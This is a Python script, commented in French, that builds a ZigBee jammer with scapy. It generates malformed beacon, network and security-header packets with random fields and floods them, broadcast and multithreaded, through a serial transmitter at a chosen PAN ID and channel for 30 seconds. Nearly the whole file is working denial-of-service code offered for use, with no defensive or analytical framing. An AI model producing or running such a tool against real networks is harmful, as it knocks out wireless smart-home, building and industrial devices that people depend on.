import serial
import time
import queue
import threading
import multiprocessing
import signal
from scapy.all import *
from scapy.layers.zigbee import ZigbeeNWK, ZigbeeSecurityHeader, ZigbeeAppDataPayload, ZigBeeBeacon

class ZigBeeJammer:
    def __init__(self, port_serie, pan_id, canal, vitesse_baud=115200, nombre_threads=None):
        self.port_serie = port_serie
        self.pan_id = pan_id
        self.canal = canal
        self.vitesse_baud = vitesse_baud
        self.nombre_threads = nombre_threads or multiprocessing.cpu_count()
        self.file_paquets = queue.Queue(maxsize=1000)
        self.compteur_paquets = multiprocessing.Value('i', 0)
        self.evenement_arret = threading.Event()
        self.verrou_serie = threading.Lock()

    def generer_paquet_malforme(self) -> bytes:
        """
        Génère un paquet ZigBee mal formé pour perturber le réseau.
        """
        try:
            paquet = (
                ZigBeeBeacon(proto_id=0x00, extended_pan_id=self.pan_id) /
                ZigbeeNWK(
                    radius=1,
                    seqnum=random.randint(0, 255),
                    destination=0xFFFF,
                    source=0x0000
                ) /
                ZigbeeSecurityHeader(
                    key_type=random.randint(0, 255),
                    nwk_seclevel=0x00,
                    fc=random.randint(0, 0xFFFFFFFF),
                    source=0x0000,
                    key_seqnum=random.randint(0, 255)
                ) /
                ZigbeeAppDataPayload(
                    raw(b'\x01' + os.urandom(10))
                )
            )
            return bytes(paquet)
        except Exception as e:
            print(f"Erreur dans la génération du paquet : {e}")
            return b''

    def transmettre_paquets(self, connexion_serie):
        """
        Transmet des paquets extraits de la file vers le port série.
        """
        while not self.evenement_arret.is_set():
            try:
                paquet = self.file_paquets.get(timeout=0.1)
                if paquet is None:  # Marqueur d'arrêt
                    break
                with self.verrou_serie:
                    connexion_serie.write(paquet)
                    with self.compteur_paquets.get_lock():
                        self.compteur_paquets.value += 1
            except queue.Empty:
                continue
            except Exception as e:
                #print(f"Erreur de transmission : {e}")
                break

    def flooder_reseau(self, duree=None):
        """
        Lance le flooding des paquets pour perturber le réseau ZigBee.

        Args:
            duree (float): Durée du flooding en secondes.
        """
        print(f"Perturbation du réseau ZigBee :")
        print(f"  PAN ID : 0x{self.pan_id:04X}")
        print(f"  Canal : {self.canal}")

        try:
            with serial.Serial(self.port_serie, self.vitesse_baud, timeout=1) as connexion_serie:
                threads = [
                    threading.Thread(target=self.transmettre_paquets, args=(connexion_serie,), daemon=True)
                    for _ in range(self.nombre_threads)
                ]
                for thread in threads:
                    thread.start()

                debut = time.time()
                while not self.evenement_arret.is_set():
                    if duree and (time.time() - debut > duree):
                        self.evenement_arret.set()
                        break  # Arrêt du flood

                    try:
                        paquet = self.generer_paquet_malforme()
                        if paquet:
                            self.file_paquets.put_nowait(paquet)
                    except queue.Full:
                        time.sleep(0.01)

                # Insérer des marqueurs d'arrêt dans la file pour terminer les threads
                for _ in threads:
                    self.file_paquets.put(None)

                # Attendre la fin des threads
                for thread in threads:
                    thread.join()
        except serial.SerialException as e:
            print(f"Erreur série : {e}")
        finally:
            self.evenement_arret.set()

    def afficher_statistiques(self):
        """
        Affiche les statistiques des paquets transmis.
        """
        print(f"\n Statistiques :")
        print(f"Total de paquets envoyés : {self.compteur_paquets.value}")

# Gestionnaire de signal pour afficher les statistiques
def gerer_sigint(signal_num, frame):
    print("\narrêt du programme.")
    jammer.evenement_arret.set()
    jammer.afficher_statistiques()
    exit(0)

# Exemple d'utilisation
if __name__ == "__main__":
    port = "/dev/ttyACM2"  # Remplacez par le port série de votre émetteur ZigBee
    pan_id = 0x1900  # PAN ID cible
    canal = 13  # Canal ZigBee

    jammer = ZigBeeJammer(
        port_serie=port,
        pan_id=pan_id,
        canal=canal
    )

    # Associer SIGINT (Ctrl+C) au gestionnaire
    signal.signal(signal.SIGINT, gerer_sigint)

    try:
        jammer.flooder_reseau(duree=30)  # Perturber pendant 30 secondes ou jusqu'à l'interruption
    except Exception as e:
        print(f"Erreur inattendue : {e}")
